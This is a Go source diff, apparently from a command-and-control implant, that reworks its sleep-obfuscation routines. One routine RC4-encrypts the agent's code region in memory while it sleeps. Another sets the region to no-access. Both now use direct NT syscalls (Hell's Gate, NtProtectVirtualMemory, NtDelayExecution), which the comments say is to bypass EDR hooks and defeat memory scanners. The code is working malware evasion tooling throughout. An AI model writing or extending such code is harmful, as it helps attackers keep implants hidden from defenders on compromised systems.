@@ -39,11 +39,13 @@ func sleepObf(d time.Duration) {
 }
 
 // sleepEkkoLite RC4-encrypts the agent's .text region, sleeps, then decrypts.
-// SystemFunction032 is a native Windows RC4 implementation in advapi32.dll —
-// using it avoids a custom XOR loop that is trivially detectable by YARA.
 //
-// Key is derived from the current process ID XOR'd with the sleep duration
-// to produce a unique key per sleep cycle.
+// All VirtualProtect calls use NtProtectVirtualMemory via direct syscall
+// (Hell's Gate) so EDR hooks on VirtualProtect/NtProtectVirtualMemory are
+// bypassed. The sleep itself uses NtDelayExecution directly instead of the
+// hooker-friendly kernel32!Sleep path.
+//
+// Key is derived from the region base XOR'd with sleep duration — unique each cycle.
 func sleepEkkoLite(base, size uintptr, d time.Duration) {
 	key := makeRC4Key(base, d)
 	keySlice := key[:]
@@ -59,42 +61,49 @@ func sleepEkkoLite(base, size uintptr, d time.Duration) {
 		Buffer:        base,
 	}
 
-	// Make region RW so SystemFunction032 can encrypt in-place.
-	var oldProtect uint32
-	procVirtualProtect.Call(base, size, uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
+	// Flip to RW via direct NT syscall so SystemFunction032 can write in-place.
+	oldProtect, err := ntProtectSelf(base, size, pageReadWrite)
+	if err != nil {
+		time.Sleep(d)
+		return
+	}
 
-	// Encrypt (RC4 is symmetric — same call decrypts).
+	// RC4 encrypt (symmetric — same call decrypts).
 	procSystemFunction032.Call(
 		uintptr(unsafe.Pointer(&regionData)),
 		uintptr(unsafe.Pointer(&regionKey)),
 	)
 
-	// Restore protection to RX so any stray execution doesn't fault.
-	procVirtualProtect.Call(base, size, uintptr(pageExecRead), uintptr(unsafe.Pointer(&oldProtect)))
+	// Restore to RX while sleeping so any stray fetch gets an RX region (not RW).
+	ntProtectSelf(base, size, pageExecRead) //nolint:errcheck
 
-	time.Sleep(d)
+	// Sleep via NtDelayExecution direct syscall — avoids Sleep/SleepEx hooks.
+	ntDelay(d)
 
-	// Flip back to RW and decrypt.
-	procVirtualProtect.Call(base, size, uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
+	// Flip back to RW to decrypt.
+	ntProtectSelf(base, size, pageReadWrite) //nolint:errcheck
 	procSystemFunction032.Call(
 		uintptr(unsafe.Pointer(&regionData)),
 		uintptr(unsafe.Pointer(&regionKey)),
 	)
-	procVirtualProtect.Call(base, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+
+	// Restore original protection (typically RX).
+	ntProtectSelf(base, size, oldProtect) //nolint:errcheck
 }
 
 // sleepPeFluctuation changes the agent image region to PAGE_NOACCESS for the
-// duration of the sleep. Memory scanners that attempt to read the region will
-// get an access violation instead of shellcode bytes.
+// duration of the sleep via NtProtectVirtualMemory direct syscall. Memory
+// scanners that read the region during sleep get an access violation.
 func sleepPeFluctuation(base, size uintptr, d time.Duration) {
-	var oldProtect uint32
-	// Flip to NOACCESS — scanner reads AV during sleep.
-	procVirtualProtect.Call(base, size, uintptr(pageNoAccess), uintptr(unsafe.Pointer(&oldProtect)))
+	oldProtect, err := ntProtectSelf(base, size, pageNoAccess)
+	if err != nil {
+		time.Sleep(d)
+		return
+	}
 
-	time.Sleep(d)
+	ntDelay(d)
 
-	// Restore original protection (typically RX).
-	procVirtualProtect.Call(base, size, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+	ntProtectSelf(base, size, oldProtect) //nolint:errcheck
 }
 
 // makeRC4Key builds a 16-byte key from current base address + sleep duration.
